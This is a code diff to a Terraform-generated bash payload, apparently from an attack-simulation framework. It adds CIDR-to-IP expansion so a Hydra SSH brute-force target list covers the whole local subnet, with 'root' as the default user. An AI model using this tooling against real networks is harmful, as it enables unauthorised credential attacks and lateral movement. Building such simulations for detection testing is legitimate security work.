@@ -7,6 +7,40 @@ locals {
     ])
     base64_command_payload = base64encode(var.inputs["payload"])
     payload = <<-EOT
+    # Function to convert IP address to decimal
+    ip_to_dec() {
+        local IFS=.
+        read ip1 ip2 ip3 ip4 <<< "$1"
+        echo "$((ip1 * 16777216 + ip2 * 65536 + ip3 * 256 + ip4))"
+    }
+
+    # Function to convert decimal to IP address
+    dec_to_ip() {
+        local ip dec=$1
+        for e in {3..0}; do
+            ((octet = dec / (256 ** e) ))
+            ((dec -= octet * 256 ** e))
+            ip+="$${octet}."
+        done
+        echo "$${ip%?}"
+    }
+
+    # Main function to generate IP list from CIDR
+    generate_ips() {
+        local cidr="$1"
+        local ip="$${cidr%/*}"
+        local prefix="$${cidr#*/}"
+        local netmask=$((0xffffffff ^ ((1 << (32 - prefix)) - 1)))
+
+        local start=$(ip_to_dec "$ip")
+        local start=$((start & netmask))
+        local end=$((start | ((1 << (32 - prefix)) - 1)))
+
+        for ((ip= start; ip <= end; ip++)); do
+            dec_to_ip "$ip"
+        done
+    }
+
     log "cleaning app directory"
     rm -rf ${local.attack_dir}
     mkdir -p ${local.attack_dir}
@@ -17,7 +51,7 @@ locals {
         LOCAL_NET=$(ip -o -f inet addr show | awk '/scope global/ {print $4}' | head -1)
         log "LOCAL_NET: $LOCAL_NET"
         log "Targets: ${join(",", local.targets)}"
-        echo "${ length(local.targets) > 0 ? join("\n", local.targets) : "$LOCAL_NET" }" > /tmp/hydra-targets.txt
+        echo "${ length(local.targets) > 0 ? join("\n", local.targets) : "$(generate_ips $LOCAL_NET)" }" > /tmp/hydra-targets.txt
         cat > /tmp/hydra-users.txt <<'EOF'
     ${try(length(var.inputs["ssh_user"].username),"false") != "false" ? var.inputs["ssh_user"].username : "root" }
     EOF
